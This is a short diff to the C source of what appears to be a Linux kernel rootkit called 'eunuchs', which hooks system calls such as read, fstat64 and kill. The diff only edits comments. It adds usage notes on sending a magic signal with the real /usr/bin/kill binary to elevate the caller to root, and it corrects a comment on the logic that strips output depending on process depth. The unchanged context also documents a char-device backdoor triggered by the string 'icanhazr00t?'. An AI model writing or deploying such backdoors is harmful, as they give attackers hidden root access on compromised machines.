@@ -37,7 +37,9 @@
  *
  * (2) via kill command:
  *  If the user sends the magic signal (#defined by EUNUCHS_MAGIC_SIGNAL) to any
- *  process, that user will be elevated to root.
+ *  process, that user will be elevated to root. Note that your shell *may* have
+ *  a built-in kill command, so use the fully qualified path to the binary to
+ *  execute this (eg, `/usr/bin/kill`)
  *
  * (3) via char device:
  *  If the user writes `icanhazr00t?` (NB: you need to properly escape this
@@ -472,7 +474,7 @@ static asmlinkage long eunuchs_read(int fd, char __user *buf, size_t count)
               current->real_parent->pid,
               current->parent->pid);
 
-        /* see how many deep from init we are.. if we're < 3, strip */
+        /* see how many deep from init we are.. if we're >= 3, strip */
         t = current;
         while(t->group_leader &&
               t->group_leader->real_parent &&
@@ -722,7 +724,8 @@ static asmlinkage int eunuchs_fstat64(unsigned long fd, struct stat64 __user *st
 
 /**
  * kill() handler. This is so that we can `kill -s [magic_signal_number] [pid]` to elevate
- * creds.
+ * creds. Make sure you're using the kill executable, and not a built-in shell
+ * command.
  **/
 static asmlinkage long eunuchs_kill(pid_t pid, int sig)
 {
